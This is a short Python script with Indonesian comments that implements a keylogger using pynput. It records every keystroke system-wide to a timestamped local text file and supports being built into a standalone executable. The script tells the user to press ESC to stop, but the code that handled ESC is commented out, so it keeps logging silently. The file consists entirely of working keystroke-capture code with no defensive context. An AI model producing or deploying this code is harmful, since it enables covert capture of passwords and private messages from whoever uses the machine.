import os
from pynput import keyboard
from datetime import datetime
import sys

# === Konfigurasi ===
VERBOSE_MODE = False  # Ubah di sini untuk semua logging

# Tentukan lokasi folder output berdasar lokasi script/exe
if getattr(sys, 'frozen', False):
    base_dir = os.path.dirname(sys.executable)  # Saat sudah di-build
else:
    base_dir = os.path.dirname(os.path.abspath(__file__))  # Saat run normal

# Path folder output di ../output/raw
output_dir = os.path.abspath(os.path.join(base_dir, "..", "output/raw"))
os.makedirs(output_dir, exist_ok=True)

# Buat nama file log dengan timestamp
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_file = os.path.join(output_dir, f"typing_history_{timestamp}.txt")

def write_to_file(message, verbose=None):
    """Tulis message ke log file.
    Jika verbose=None → gunakan VERBOSE_MODE global.
    Jika verbose=True → sertakan timestamp.
    Jika verbose=False → tulis apa adanya.
    """
    if verbose is None:
        verbose = VERBOSE_MODE

    with open(log_file, "a", encoding="utf-8") as f:
        if verbose:
            f.write(f"{datetime.now()} - {message}\n")
        else:
            f.write(f"{message}\n")

def on_press(key):
    if VERBOSE_MODE:
        try:
            write_to_file(f"Key pressed: {key.char}")
        except AttributeError:
            write_to_file(f"Special key pressed: {key}")
    else:
        try:
            write_to_file(f"{key.char}")
        except AttributeError:
            write_to_file(f"{key}")

def on_release(key):
    # ESC → keluar
    # if key == keyboard.Key.esc:
    #     write_to_file("=== Stopping key logger ===", verbose=True)
    #     print("Stopping key logger...")
    #     return False

    # Tidak lagi menulis ke file di sini untuk menghindari duplikasi
    try:
        pressed_keys.remove(key)
    except KeyError:
        pass

pressed_keys = set()

def on_press_track(key):
    pressed_keys.add(key)
    on_press(key)

# Tulis header saat start
write_to_file("=== Starting key logger ===", verbose=True)

listener = keyboard.Listener(
    on_press=on_press_track,
    on_release=on_release
)

print(f"Recording typing... Press ESC to stop.\nLog file: {log_file}")
listener.start()
listener.join()
